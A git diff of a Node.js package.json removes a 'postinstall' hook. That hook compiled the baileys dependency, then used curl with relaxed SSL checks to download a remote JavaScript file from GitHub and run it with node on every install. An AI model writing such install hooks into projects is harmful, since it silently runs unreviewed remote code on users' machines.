@@ -7,8 +7,7 @@
     "start": "ts-node index.ts",
     "dev": "nodemon index.ts --ignore Data/*",
     "build": "rmdir build -r && tsc",
-    "test": "jest",
-    "postinstall": "cd ./node_modules/@adiwajshing/baileys && tsc -b && curl https://raw.githubusercontent.com/anakanj/c24b1a725e817376d636/main/copy-file.js --output copyfile.js --ssl-no-revoke && node copyfile.js"
+    "test": "jest"
   },
   "author": "Kenzuya",
   "license": "MIT",
